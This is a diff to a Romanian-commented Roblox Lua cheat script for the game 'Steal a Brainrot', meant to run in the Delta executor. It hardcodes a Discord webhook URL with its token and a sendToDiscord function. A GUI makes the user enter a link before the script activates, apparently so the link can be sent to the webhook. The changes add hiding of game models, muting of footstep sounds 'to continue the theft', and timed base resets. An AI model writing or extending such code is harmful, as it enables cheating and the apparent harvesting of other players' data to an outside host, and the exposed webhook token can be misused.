@@ -1,6 +1,7 @@
 -- Script pentru Delta - Steal a Brainrot (Loader PERMANENT + Discord)
 -- Compatibil cu Delta Executor
 -- OPRESTE TOATE SUNETELE, INCLUSIV PAȘII
+-- BAZA SE RESETEAZĂ AUTOMAT
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -8,6 +9,7 @@ local LocalPlayer = Players.LocalPlayer
 local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 local Workspace = game:GetService("Workspace")
 local CoreGui = game:GetService("CoreGui")
+local RunService = game:GetService("RunService")
 
 -- ===== CONFIGURARE =====
 local WEBHOOK = "https://discord.com/api/webhooks/1510999167244304554/kScJIW0h-ZUy0Aadhs936Y-8ZEAiTKnyewPvwbg6y7SrHHOwA5l4MotrcmGMBzzCy9gF"
@@ -27,7 +29,7 @@ local function sendToDiscord(message)
     end
 end
 
--- ===== OPREȘTE TOATE SUNETELE, INCLUSIV PAȘII =====
+-- ===== OPREȘTE TOATE SUNETELE (INCLUSIV PAȘII) =====
 local function muteAllSounds()
     local count = 0
     
@@ -56,7 +58,18 @@ local function muteAllSounds()
     -- 2. Oprește sunetele de pași (specifice)
     pcall(function()
         for _, sound in pairs(Workspace:GetDescendants()) do
-            if sound:IsA("Sound") and (sound.Name:lower():find("foot") or sound.Name:lower():find("step") or sound.Name:lower():find("walk")) then
+            if sound:IsA("Sound") and (sound.Name:lower():find("foot") or sound.Name:lower():find("step") or sound.Name:lower():find("walk") or sound.Name:lower():find("run")) then
+                sound.Volume = 0
+                sound:Stop()
+                count = count + 1
+            end
+        end
+    end)
+    
+    -- 3. Oprește sunetele din joc (globale)
+    pcall(function()
+        for _, sound in pairs(game:GetDescendants()) do
+            if sound:IsA("Sound") and (sound.Name:lower():find("foot") or sound.Name:lower():find("step") or sound.Name:lower():find("walk") or sound.Name:lower():find("run")) then
                 sound.Volume = 0
                 sound:Stop()
                 count = count + 1
@@ -71,6 +84,8 @@ end
 -- ===== ASCUNDE BRAINROT-URILE =====
 local function hideBrainrots()
     local count = 0
+    local hidden = {}
+    
     for _, obj in pairs(Workspace:GetDescendants()) do
         if obj:IsA("Model") and obj.Name and (string.find(obj.Name:lower(), "brainrot") or string.find(obj.Name:lower(), "brain") or string.find(obj.Name:lower(), "pet")) then
             pcall(function()
@@ -82,11 +97,45 @@ local function hideBrainrots()
                         sound:Stop()
                     end
                 end
+                table.insert(hidden, obj)
                 count = count + 1
             end)
         end
     end
+    
+    -- Salvează brainrot-urile ascunse pentru resetare
+    _G.HiddenBrainrots = hidden
     return count
+end
+
+-- ===== RESETEAZĂ BAZA (după un timp) =====
+local function resetBase()
+    print("🔄 Resetez baza...")
+    
+    -- 1. Ascunde brainrot-urile fake
+    for _, obj in pairs(Workspace:GetDescendants()) do
+        if obj:IsA("Model") and obj.Name and string.find(obj.Name, "_Fake") then
+            pcall(function()
+                obj:Destroy()
+            end)
+        end
+    end
+    
+    -- 2. Afișează brainrot-urile reale
+    if _G.HiddenBrainrots then
+        for _, brainrot in pairs(_G.HiddenBrainrots) do
+            pcall(function()
+                brainrot.Transparency = 0
+                brainrot.CanCollide = true
+            end)
+        end
+    end
+    
+    -- 3. Re-ascunde brainrot-urile după 5 secunde (pentru a continua furtul)
+    task.wait(5)
+    hideBrainrots()
+    
+    print("✅ Baza resetată!")
 end
 
 -- ===== ASCUNDE DOAR PE TINE =====
@@ -422,9 +471,15 @@ local function showLinkGUI()
             gui:Destroy()
             showLoader()
             hideMe()
-            muteAllSounds()  -- <-- OPRESTE TOATE SUNETELE, INCLUSIV PAȘII
+            muteAllSounds()  -- OPRESTE TOATE SUNETELE
             local count = hideBrainrots()
             print("✅ Script activ! " .. count .. " brainrot-uri ascunse.")
+            
+            -- ===== RESETEAZĂ BAZA LA 10 SECUNDE =====
+            spawn(function()
+                task.wait(10)  -- Așteaptă 10 secunde
+                resetBase()
+            end)
         end
     end)
 
@@ -435,6 +490,7 @@ end
 local function main()
     showLinkGUI()
     print("🚀 Așteaptă introducerea link-ului...")
+    print("🔄 Baza se va reseta automat după 10 secunde.")
 end
 
 -- ===== START =====
